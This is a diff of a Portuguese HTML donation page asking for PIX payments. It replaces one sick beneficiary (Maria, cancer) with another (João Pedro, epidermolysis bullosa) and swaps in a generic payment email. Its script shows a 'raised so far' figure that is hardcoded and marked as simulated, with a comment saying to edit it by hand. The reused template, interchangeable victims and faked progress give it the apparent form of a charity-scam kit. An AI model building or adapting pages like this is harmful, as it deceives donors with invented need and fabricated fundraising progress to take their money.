@@ -3,123 +3,151 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Ajude a Maria na luta contra o câncer</title>
+  <title>Ajude João Pedro - Epidermólise Bolhosa</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f9f9f9;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f9fafb;
+      color: #333;
       margin: 0;
       padding: 0;
-      text-align: center;
     }
 
     header {
-      background-color: #d9534f;
+      background-color: #005792;
       color: white;
-      padding: 20px 10px;
+      padding: 40px 20px;
+      text-align: center;
     }
 
-    main {
+    header h1 {
+      margin-bottom: 10px;
+    }
+
+    .container {
+      max-width: 800px;
+      margin: 40px auto;
       padding: 20px;
+      background: white;
+      box-shadow: 0 0 10px rgba(0,0,0,0.05);
+      border-radius: 10px;
     }
 
-    img.maria {
-      width: 250px;
-      max-width: 90%;
-      border-radius: 15px;
-      margin: 20px 0;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-    }
-
-    .pix-box {
-      background: #fff;
-      padding: 20px;
-      margin: 20px auto;
-      border-radius: 8px;
-      max-width: 500px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    .pix-section {
+      text-align: center;
+      margin-bottom: 30px;
     }
 
     .pix-key {
-      font-size: 1.1em;
-      margin: 10px 0;
-      word-break: break-word;
-    }
-
-    .button-group {
-      margin-top: 20px;
-    }
-
-    .donate-button {
-      background-color: #d9534f;
-      color: white;
-      border: none;
-      padding: 10px 20px;
-      margin: 5px;
-      font-size: 16px;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-
-    .donate-button:hover {
-      background-color: #c9302c;
+      font-size: 1.2em;
+      margin-bottom: 10px;
+      word-break: break-all;
     }
 
     .copy-btn {
-      background-color: #5cb85c;
-      margin-top: 10px;
+      background-color: #0077cc;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      font-size: 1em;
+      cursor: pointer;
     }
 
     .copy-btn:hover {
-      background-color: #4cae4c;
+      background-color: #005fa3;
+    }
+
+    .progress-section {
+      margin-top: 40px;
+    }
+
+    .progress-bar-container {
+      background-color: #e0e0e0;
+      border-radius: 25px;
+      overflow: hidden;
+      height: 30px;
+      margin-top: 10px;
+    }
+
+    .progress-bar {
+      height: 100%;
+      background-color: #00b386;
+      text-align: center;
+      color: white;
+      font-weight: bold;
+      line-height: 30px;
+      width: 0%;
+    }
+
+    .goal-info {
+      text-align: center;
+      margin-top: 10px;
     }
 
     footer {
+      text-align: center;
+      background-color: #f0f0f0;
+      padding: 30px 20px;
+      font-size: 1.1em;
       margin-top: 40px;
-      color: #888;
-      font-size: 0.9em;
+    }
+
+    @media (max-width: 600px) {
+      .copy-btn {
+        width: 100%;
+      }
     }
   </style>
 </head>
 <body>
   <header>
-    <h1>Ajude a Maria na luta contra o câncer</h1>
+    <h1>Ajude João Pedro</h1>
+    <p>Contribua para o tratamento da Epidermólise Bolhosa</p>
   </header>
 
-  <main>
-    <!-- Imagem da Maria -->
-    <img src="maria.jpg" alt="Maria sorrindo com um ursinho de pelúcia" class="maria">
+  <div class="container">
+    <section class="pix-section">
+      <h2>Chave PIX</h2>
+      <div class="pix-key" id="pixKey">ajudedoandohoje@gmail.com</div>
+      <button class="copy-btn" onclick="copiarPix()">Copiar Chave PIX</button>
+    </section>
 
-    <p>A Maria está precisando da sua ajuda para se recuperar. Sua contribuição pode fazer toda a diferença!</p>
-    <h2>Meta: R$10.000,00</h2>
-
-    <div class="pix-box">
-      <h3>Doe via PIX</h3>
-      <p>Chave PIX (e-mail):</p>
-      <div class="pix-key" id="pixKey">mariaaeduarda0771@gmail.com</div>
-      <button class="donate-button copy-btn" onclick="copiarPix()">Copiar Chave PIX</button>
-
-      <div class="button-group">
-        <h4>Escolha um valor para doar:</h4>
-        <button class="donate-button">R$10</button>
-        <button class="donate-button">R$25</button>
-        <button class="donate-button">R$50</button>
-        <button class="donate-button">R$100</button>
-        <button class="donate-button">Outro valor</button>
+    <section class="progress-section">
+      <h2>Meta de Arrecadação</h2>
+      <div class="progress-bar-container">
+        <div class="progress-bar" id="progressBar">0%</div>
       </div>
-    </div>
-  </main>
+      <div class="goal-info" id="goalInfo">
+        Arrecadado até agora: R$ 0<br/>
+        Meta: R$ 10.000
+      </div>
+    </section>
+  </div>
 
   <footer>
-    <p>Obrigado por sua ajuda! 💖</p>
+    Muito obrigado por sua doação! 💙<br>
+    Sua generosidade faz toda a diferença na vida do João Pedro.
   </footer>
 
   <script>
+    // Valor arrecadado (simulado)
+    const valorArrecadado = 4230; // <-- Altere esse valor conforme atualizações
+    const meta = 10000;
+
+    const porcentagem = Math.min((valorArrecadado / meta) * 100, 100);
+    const progressBar = document.getElementById("progressBar");
+    progressBar.style.width = porcentagem + "%";
+    progressBar.textContent = Math.floor(porcentagem) + "%";
+
+    document.getElementById("goalInfo").innerHTML = 
+      `Arrecadado até agora: R$ ${valorArrecadado.toLocaleString("pt-BR")}<br/>Meta: R$ ${meta.toLocaleString("pt-BR")}`;
+
     function copiarPix() {
       const pixKey = document.getElementById("pixKey").textContent;
-      navigator.clipboard.writeText(pixKey).then(() => {
-        alert("Chave PIX copiada!");
-      });
+      navigator.clipboard.writeText(pixKey)
+        .then(() => alert("Chave PIX copiada com sucesso!"))
+        .catch(() => alert("Erro ao copiar a chave PIX."));
     }
   </script>
 </body>
